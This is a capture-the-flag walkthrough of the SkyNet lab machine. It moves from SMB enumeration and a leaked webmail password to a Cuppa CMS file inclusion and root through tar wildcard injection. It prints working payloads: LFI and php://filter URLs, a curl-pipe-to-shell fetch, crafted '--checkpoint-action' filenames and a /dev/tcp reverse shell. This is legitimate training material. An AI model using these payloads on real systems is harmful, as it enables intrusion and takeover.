---
title: SkyNet
tags:
- writeups
---

## Enumeration
![[write-ups/images/Pasted image 20220822143023.png]]
- for smb I ran `enum4linux` in the background
	- ![[write-ups/images/Pasted image 20220822145222.png]]
	- tried anonymous login & found this
	- ![[write-ups/images/Pasted image 20220822145314.png]]
	- ![[write-ups/images/Pasted image 20220822145346.png]]
	- so we have a list of potential passwords for the `mikedyson` user
- goin on the web server we have this search bar
	- ![[write-ups/images/Pasted image 20220822145457.png]]
	- however it doesn't seem to do anything so I ran `gobuster`
	- ![[write-ups/images/Pasted image 20220822145603.png]]
	- most of them gave me [403 Frobidden](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403), but [squirrelmail](https://www.squirrelmail.org/) was available which is *"a standards-based webmail package written in PHP"*. As we've seen in the nmap scan the target is running a mail server & this is a front-end to that
	- ![[write-ups/images/Pasted image 20220822145944.png]]

## Getting user 

### Password Leak
So remembering my list from smb, I tried logging in as `milesdyson` with the first one & it just worked 
![[write-ups/images/Pasted image 20220822150038.png]]

Going through the mails we see that we might have a SMB password leak
![[write-ups/images/Pasted image 20220822150148.png]]
And indeed we do, now we can have a look at the `milesdyson` shared folder.
![[write-ups/images/Pasted image 20220822152030.png]]
Books on machine learning and a bunch of notes, while interesting not so useful for us. However, I still downloaded everything: `smbget -R smb://10.10.94.44/milesdyson -U milesdyson`. Going through the files, one popped up:
![[write-ups/images/Pasted image 20220822153006.png]]
Hmm, to test if it's actually running a CMS on that endpoint I went to the browser
![[write-ups/images/Pasted image 20220822153049.png]]

### Local File Inclusion to RCE
Besides getting more insight in who Miles Dyson is we can't to much. Going back to gobuster revealed `/administrator` which runs [cuppa CMS](https://www.cuppacms.com/)
![[write-ups/images/Pasted image 20220822153616.png]]
Tried to login as `milesdyson` hoping to have some kind of credential reuse & also the defaults, but nothing. At this point I went to my old friend google & found a [file inclusion](https://www.exploit-db.com/exploits/25971). To try it I went to the following URL: `http://10.10.94.44/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
![[write-ups/images/Pasted image 20220822153840.png]]
As the exploit note says, we can access `Configuration.php` & leak the password by supplying this payload:`urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`. It will get us the contents of the configuration file in base64, so decode it and voila:
![[write-ups/images/Pasted image 20220822154222.png]]
Or we can do more nasty stuff such as executing php code & getting a [reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
![[write-ups/images/Pasted image 20220822160118.png]]

## Cron with wildcard injection privesc
Once I got onto the system I ran the [pwncat's enumeration module](https://pwncat.readthedocs.io/en/latest/enum.html) & linpeas: `curl http://10.18.12.227:8000/linepas.sh | sh` . While taking my time going through anything peculiar I noticed a `backup.sh` in `milesdyson` home dir which is owned by `root`
![[write-ups/images/Pasted image 20220822161050.png]]

As it turns out, the backup acts a cron job that runs [once every minute](https://crontab.guru/#*/1_*_*_*_*)
![[write-ups/images/Pasted image 20220822160816.png]]

Taking a look again at the `backup.sh` script I noticed it ran `tar` with a general wildcard `*` and not `/path/*` or `./*`. Thus we can do unexpected things, such as privesc, through [[Wildcard Injection]]. If confused about the topic take a look at [this paper](https://www.exploit-db.com/papers/33930) going in depth. The basic idea is that we can inject arbitrary arguments to shell commands by creating specially crafted filenames.

In our case we have to look @ [tar](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar) & identify args that can be used for poisoning: `--checkpoint` and `--checkpoint-action` are our cadidates:
![[write-ups/images/Pasted image 20220822170616.png]]

Going forward we need to create 2 files: `--checkpoint=1` and `--checkpoint-action=exec=sh privesc.sh`, placing them in `/var/www/html` *(since that's where `tar` gets executed)*. Doing that, tar will get confused & treat our files as arguments that instruct it to execute our `privesc.sh` script as `root`.
```bash
echo 'bash -i >& /dev/tcp/10.18.12.227/1337 0>&1' > privesc.sh && touch "/var/www/html/--checkpoint=1" "/var/www/html/--checkpoint-action=exec=sh privesc.sh"
```

Now we just need to wait 1 minute to get our root shell ☕
![[write-ups/images/Pasted image 20220822165638.png]]


## See Also
- [[Wildcard Injection]]
- [[write-ups/THM]]
